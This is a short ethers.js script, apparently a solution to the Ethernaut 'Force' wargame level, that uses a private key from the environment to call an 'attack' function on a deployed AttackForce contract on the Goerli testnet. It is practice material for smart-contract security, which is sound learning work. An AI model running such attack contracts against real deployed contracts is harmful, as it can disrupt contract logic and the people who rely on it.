require("dotenv").config()

const PRIVATE_KEY = process.env.PRIVATE_KEY;
const CONTRACT_ADDRESS = process.env.ATTACK_FORCE_GOERLI_ADDRESS;
const FORCE_ADDRESS = "0x5b5de67FD467eeD1579714567aE5A34DC05c725C"

const contractABI = require("../artifacts/contracts/AttackForce.sol/AttackForce.json");

// Provider
const provider = ethers.getDefaultProvider('goerli');

// Signer
const signer = new ethers.Wallet(PRIVATE_KEY, provider);

// Contract
const attackForce = new ethers.Contract(CONTRACT_ADDRESS, contractABI.abi, signer);


async function main() {
  // await attackForce.deposit({ value: ethers.utils.parseEther("1") })

  // const forceBalance = await attackForce.provider.getBalance(attackForce.address)
  // console.log("AttackForce balance: ", forceBalance.toString());

  // Ethernaut address Force = 0x5b5de67FD467eeD1579714567aE5A34DC05c725C
  await attackForce.attack(FORCE_ADDRESS);

}

main();
